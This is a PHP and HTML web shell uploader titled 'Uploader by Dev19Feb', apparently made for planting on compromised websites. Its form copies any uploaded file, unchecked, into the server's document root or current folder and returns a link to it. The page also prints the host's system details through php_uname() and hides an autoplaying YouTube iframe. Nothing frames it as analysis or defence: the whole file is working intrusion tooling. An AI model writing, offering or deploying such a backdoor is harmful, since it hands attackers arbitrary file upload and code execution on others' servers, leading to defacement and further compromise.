<html lang='en-US'><head><title>@2017 Uploader by Dev19Feb</title>
<style>
body{cursor:url("http:///foro.elhacker.net/elhacker.cur"),auto;}html{display:table;height:100%;width:100%;}body{display:table-row;}body{display:table-cell;vertical-align:middle;text-align:center;}a:link{text-decoration:none;}
body {
	  background-color: #000000;
	background-image: url(https://r.kyaa.sg/pigxyf.png);
<!--http://www.twitrcover.com/ar/uploads/Al-Quds-Twitter-Header-8534.jpg-->
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
	background-position:right top;
	background-repeat:no-repeat;
	background-size:110%
}


.style1 {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 12px;
}
</style>
<center><?php
echo "<form method='post' enctype='multipart/form-data'>
      <input type='file' name='idx_file'>
      <input type='submit' name='upload' value='upload'>
      </form>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['idx_file']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
    if(is_writable($root)) {
        if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {
            $web = "http://".$_SERVER['HTTP_HOST']."/";
            echo "tenang ges ka upload > -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
        } else {
            echo "gagal upload root >:(";
        }
    } else {
        if(@copy($_FILES['idx_file']['tmp_name'], $files)) {
            echo "tenang ges ka upload > <b>$files</b> di folder ini";
        } else {
            echo "gagal upload >:(";
        }
    }
}
?></center>
<?php
echo "<center><b><font color='black'>".php_uname()."</b></font>";
?>
<br>
<iframe width="0" height="0" src="https://www.youtube.com/watch?v=WIKqgE4BwAY?&amp;autoplay=1" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>